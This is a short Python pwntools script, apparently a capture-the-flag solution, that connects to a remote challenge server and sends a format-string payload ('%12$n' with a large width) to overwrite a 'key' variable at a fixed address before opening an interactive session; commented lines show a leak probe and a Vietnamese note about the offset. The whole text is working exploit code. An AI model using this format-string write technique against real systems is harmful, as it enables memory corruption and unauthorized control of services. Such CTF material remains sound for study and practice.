from pwn import *
#p = process("./005")
h,p = '111.200.241.244',52103
p = remote(h,p)
key_addr = 0x0804A048

#tinh lai offset ddeeeee

#leak = "AAAA"+"%12$x"
#p.sendline(leak)

exp = p32(key_addr)+"%35795742x"+"%12$n"
p.sendline(exp)
p.interactive()
